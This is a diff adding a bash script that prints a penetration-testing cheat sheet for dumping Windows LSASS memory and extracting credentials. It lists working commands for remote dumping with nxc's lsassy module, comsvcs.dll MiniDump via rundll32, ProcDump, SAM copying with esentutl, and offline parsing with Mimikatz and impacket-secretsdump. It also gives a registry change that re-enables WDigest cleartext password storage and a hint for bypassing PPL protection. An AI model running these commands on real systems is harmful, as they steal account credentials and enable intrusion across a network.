@@ -1,0 +1,58 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── LSASS — DUMPING METHODS ──────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Remote Dump (no interactive session) ─────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy${NC}   # lsassy module"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── comsvcs.dll — LOLBAS (no tools dropped) ──────────${NC}"
+echo -e "  Note: Get lsass PID first:"
+echo -e "  ${GREEN}tasklist /fi \"imagename eq lsass.exe\"${NC}"
+printf "\n"
+echo -e "  Note: Dump (run as SYSTEM or admin):"
+echo -e "  ${GREEN}rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Tasks\\lsass.dmp full${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ProcDump (SysInternals) ──────────────────────────${NC}"
+echo -e "  ${GREEN}procdump64.exe -accepteula -ma lsass.exe lsass.dmp${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Task Manager (GUI) ───────────────────────────────${NC}"
+echo -e "  Note: Task Manager -> Details -> right-click lsass.exe -> Create dump file"
+echo -e "  Note: Output: %TEMP%\\lsass.DMP"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── esentutl (VSS-based) ─────────────────────────────${NC}"
+echo -e "  ${GREEN}esentutl /y /vss C:\\Windows\\System32\\config\\SAM /d C:\\Temp\\SAM${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Parse Dump Offline (Mimikatz) ────────────────────${NC}"
+echo -e "  ${GREEN}sekurlsa::minidump lsass.dmp${NC}"
+echo -e "  ${GREEN}sekurlsa::logonpasswords${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Parse Dump Offline (Impacket) ────────────────────${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -sam sam -system system -security security LOCAL${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── WDigest Re-enable (Cleartext on next logon) ──────${NC}"
+echo -e "  ${GREEN}reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M wdigest${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PPL Check ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL${NC}"
+echo -e "  ${BLUE}If 1 -> Mimikatz needs !+ / !processprotect bypass${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
